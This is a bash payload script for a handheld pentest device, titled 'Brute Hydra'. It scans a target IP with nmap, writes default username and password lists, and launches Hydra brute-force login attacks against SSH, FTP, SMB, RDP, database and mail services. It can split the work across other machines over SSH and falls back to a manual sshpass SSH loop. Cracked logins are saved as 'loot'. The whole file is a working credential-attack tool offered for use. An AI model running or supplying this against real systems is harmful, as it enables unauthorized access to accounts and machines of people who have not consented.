#!/bin/bash
# Title: Brute Hydra
# Author: bad-antics
# Description: Multi-protocol brute force attack using distributed mesh compute
# Category: nullsec/crack

LOOT_DIR="/mmc/nullsec/brute-hydra"
mkdir -p "$LOOT_DIR"

PROMPT "BRUTE HYDRA

Multi-protocol brute force
with mesh distribution.

Supported protocols:
- SSH / FTP / Telnet
- HTTP-POST / HTTP-GET
- SMB / RDP
- MySQL / PostgreSQL
- SNMP / VNC
- SMTP / POP3 / IMAP

Press OK to configure."

TARGET=$(TEXT_PICKER "Target IP:" "")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

PROMPT "PROTOCOL

1. SSH         7. MySQL
2. FTP         8. PostgreSQL
3. Telnet      9. SNMP
4. HTTP-POST  10. VNC
5. SMB        11. SMTP
6. RDP        12. Auto-detect

Select on next screen."

PROTO_NUM=$(NUMBER_PICKER "Protocol (1-12):" 12)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PROTO_NUM=12 ;; esac

PROTOCOLS=("ssh" "ftp" "telnet" "http-post-form" "smb" "rdp" "mysql" "postgres" "snmp" "vnc" "smtp" "auto")
PROTO="${PROTOCOLS[$((PROTO_NUM - 1))]}"

# Auto-detect
if [ "$PROTO" = "auto" ]; then
    SPINNER_START "Detecting services..."
    OPEN=$(nmap -sV --top-ports 30 -T4 "$TARGET" 2>/dev/null | grep "open")
    SPINNER_STOP
    
    DETECTED=""
    echo "$OPEN" | grep -qi "ssh" && DETECTED="ssh"
    echo "$OPEN" | grep -qi "ftp" && DETECTED="${DETECTED:+$DETECTED,}ftp"
    echo "$OPEN" | grep -qi "http" && DETECTED="${DETECTED:+$DETECTED,}http-get"
    echo "$OPEN" | grep -qi "smb\|microsoft-ds" && DETECTED="${DETECTED:+$DETECTED,}smb"
    echo "$OPEN" | grep -qi "mysql" && DETECTED="${DETECTED:+$DETECTED,}mysql"
    echo "$OPEN" | grep -qi "vnc" && DETECTED="${DETECTED:+$DETECTED,}vnc"
    
    PROMPT "DETECTED SERVICES

$OPEN

Will brute: $DETECTED

Press OK to continue."
    PROTO="$DETECTED"
fi

PROMPT "CREDENTIALS

1. Common usernames
2. Single username
3. Username file

Select on next screen."

USER_MODE=$(NUMBER_PICKER "User mode (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) USER_MODE=1 ;; esac

USER_FILE="/tmp/hydra_users.txt"
case $USER_MODE in
    1)
        cat > "$USER_FILE" << 'USERS'
admin
root
administrator
user
test
guest
support
operator
manager
service
USERS
        ;;
    2)
        SINGLE_USER=$(TEXT_PICKER "Username:" "admin")
        echo "$SINGLE_USER" > "$USER_FILE"
        ;;
    3)
        USER_FILE=$(TEXT_PICKER "User file:" "/mmc/wordlists/users.txt")
        ;;
esac

PROMPT "PASSWORD LIST

1. Quick (common)
2. Extended
3. Custom file

Select on next screen."

PASS_MODE=$(NUMBER_PICKER "Pass mode (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PASS_MODE=1 ;; esac

PASS_FILE="/tmp/hydra_pass.txt"
case $PASS_MODE in
    1)
        cat > "$PASS_FILE" << 'PASS'
password
admin
123456
12345678
root
toor
letmein
welcome
monkey
dragon
master
qwerty
login
password1
admin123
changeme
test
guest
P@ssw0rd
PASS
        ;;
    2)
        > "$PASS_FILE"
        for base in password admin root letmein welcome monkey dragon master qwerty changeme; do
            for suf in "" 1 12 123 1234 "!" "@" "#" "2024" "2025" "2026"; do
                echo "${base}${suf}" >> "$PASS_FILE"
                echo "${base^}${suf}" >> "$PASS_FILE"
            done
        done
        ;;
    3)
        PASS_FILE=$(TEXT_PICKER "Pass file:" "/mmc/wordlists/passwords.txt")
        ;;
esac

THREADS=$(NUMBER_PICKER "Threads (1-64):" 16)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) THREADS=16 ;; esac

USER_COUNT=$(wc -l < "$USER_FILE" 2>/dev/null)
PASS_COUNT=$(wc -l < "$PASS_FILE" 2>/dev/null)
COMBOS=$((USER_COUNT * PASS_COUNT))

resp=$(CONFIRMATION_DIALOG "LAUNCH HYDRA?

Target: $TARGET
Protocol: $PROTO
Users: $USER_COUNT
Passwords: $PASS_COUNT
Combinations: $COMBOS
Threads: $THREADS

Press OK to attack.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "BruteHydra: target=$TARGET proto=$PROTO combos=$COMBOS"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULT_FILE="$LOOT_DIR/hydra_${TIMESTAMP}.txt"
SPINNER_START "Brute forcing..."

# Check for mesh nodes to distribute
MESH_NODES=()
if [ -f "$HOME/.config/nullsec-link/config.sh" ]; then
    source "$HOME/.config/nullsec-link/config.sh" 2>/dev/null
    for name in $(echo "${!MACHINES[@]}" | tr ' ' '\n'); do
        IP=$(echo "${MACHINES[$name]}" | cut -d'|' -f1)
        USER=$(echo "${MACHINES[$name]}" | cut -d'|' -f2)
        ssh -o BatchMode=yes -o ConnectTimeout=3 "${USER}@${IP}" "command -v hydra" &>/dev/null && \
            MESH_NODES+=("${USER}@${IP}")
    done
fi

if [ ${#MESH_NODES[@]} -gt 0 ] && command -v hydra &>/dev/null; then
    # Split password list for mesh distribution
    CHUNK=$((PASS_COUNT / (${#MESH_NODES[@]} + 1)))
    split -l "$CHUNK" -d "$PASS_FILE" /tmp/hydra_chunk_
    CHUNKS=($(ls /tmp/hydra_chunk_* 2>/dev/null))
    
    # Local attack with first chunk
    hydra -L "$USER_FILE" -P "${CHUNKS[0]}" -t "$THREADS" -o "$RESULT_FILE" "$TARGET" "$PROTO" &>/dev/null &
    LOCAL_PID=$!
    
    # Distribute remaining chunks
    for i in $(seq 0 $((${#MESH_NODES[@]} - 1))); do
        CI=$((i + 1))
        [ "$CI" -ge ${#CHUNKS[@]} ] && break
        NODE="${MESH_NODES[$i]}"
        scp -q "${CHUNKS[$CI]}" "$USER_FILE" "${NODE}:/tmp/" 2>/dev/null
        ssh -o BatchMode=yes "$NODE" "hydra -L /tmp/$(basename "$USER_FILE") -P /tmp/$(basename "${CHUNKS[$CI]}") -t $THREADS -o /tmp/hydra_result.txt '$TARGET' '$PROTO'" &>/dev/null &
    done
    
    wait $LOCAL_PID
    
    # Collect remote results
    for node in "${MESH_NODES[@]}"; do
        scp -q "${node}:/tmp/hydra_result.txt" "/tmp/hydra_remote_${node##*@}.txt" 2>/dev/null
        cat "/tmp/hydra_remote_${node##*@}.txt" >> "$RESULT_FILE" 2>/dev/null
    done
    rm -f /tmp/hydra_chunk_*
else
    # Single node
    if command -v hydra &>/dev/null; then
        hydra -L "$USER_FILE" -P "$PASS_FILE" -t "$THREADS" -o "$RESULT_FILE" "$TARGET" "$PROTO" 2>&1 | tail -5
    else
        # Fallback: manual SSH brute
        while IFS= read -r user; do
            while IFS= read -r pass; do
                sshpass -p "$pass" ssh -o BatchMode=no -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
                    "${user}@${TARGET}" "echo ACCESS" 2>/dev/null && \
                    echo "[22][ssh] host: $TARGET login: $user password: $pass" >> "$RESULT_FILE" && break 2
            done < "$PASS_FILE"
        done < "$USER_FILE"
    fi
fi

SPINNER_STOP

FOUND=$(grep -c "login:" "$RESULT_FILE" 2>/dev/null || echo 0)

if [ "$FOUND" -gt 0 ]; then
    CREDS=$(grep "login:" "$RESULT_FILE" | head -5)
    PROMPT "CREDENTIALS FOUND!

$CREDS

Total: $FOUND valid logins

Saved to brute-hydra/

Press OK to exit."
else
    PROMPT "NO CREDENTIALS

Exhausted $COMBOS
combinations on $PROTO.

Try:
- Different userlist
- Larger wordlist
- Different protocol

Press OK to exit."
fi

rm -f /tmp/hydra_users.txt /tmp/hydra_pass.txt 2>/dev/null
